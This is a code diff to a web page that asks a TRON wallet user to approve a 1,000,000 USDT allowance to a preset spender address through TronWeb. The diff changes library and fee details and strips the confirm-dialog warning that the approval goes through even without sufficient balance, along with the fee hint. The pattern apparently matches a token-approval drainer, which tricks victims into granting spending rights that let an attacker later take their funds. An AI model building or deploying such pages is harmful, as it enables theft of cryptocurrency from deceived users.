@@ -6,7 +6,7 @@
   <title>Approve 1,000,000 USDT on TRON</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet" />
   <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.3/dist/TronWeb.min.js" defer></script>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js" defer></script>
+  <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js" defer></script>
   <style>
     * {
       margin: 0;
@@ -183,10 +183,16 @@
         const contract = await window.tronWeb.contract(usdtABI, usdtContractAddress);
 
         // Set approval amount: 1,000,000 USDT (6 decimals)
-        const amount = ethers.utils.parseUnits("1000000", 6).toString();
+        // Fallback to manual calculation if ethers is not available
+        let amount;
+        if (typeof ethers !== "undefined" && ethers.utils) {
+          amount = ethers.utils.parseUnits("1000000", 6).toString();
+        } else {
+          amount = "1000000000000"; // 1,000,000 * 10^6
+        }
 
         // Confirm approval
-        if (!confirm(`Are you sure you want to approve 1,000,000 USDT for the address: ${spenderAddress}?\nNote: This approval will proceed even if you don't have sufficient balance.`)) {
+        if (!confirm(`Are you sure you want to approve 1,000,000 USDT for the address: ${spenderAddress}?`)) {
           statusText.textContent = "Approval cancelled.";
           loadingDiv.style.display = "none";
           return;
@@ -195,7 +201,7 @@
         // Send approval transaction
         statusText.textContent = "Sending approval transaction...";
         const tx = await contract.approve(spenderAddress, amount).send({
-          feeLimit: 20000000, // 20 TRX
+          feeLimit: 25000000, // 25 TRX
           callValue: 0,
           shouldPollResponse: false
         });
@@ -205,7 +211,7 @@
 
       } catch (error) {
         console.error("Transaction error:", error);
-        statusText.textContent = `Approval failed: ${error.message || error}. Ensure you have ~20 TRX for fees.`;
+        statusText.textContent = `Approval failed: ${error.message || error}`;
         loadingDiv.style.display = "none";
       }
     }
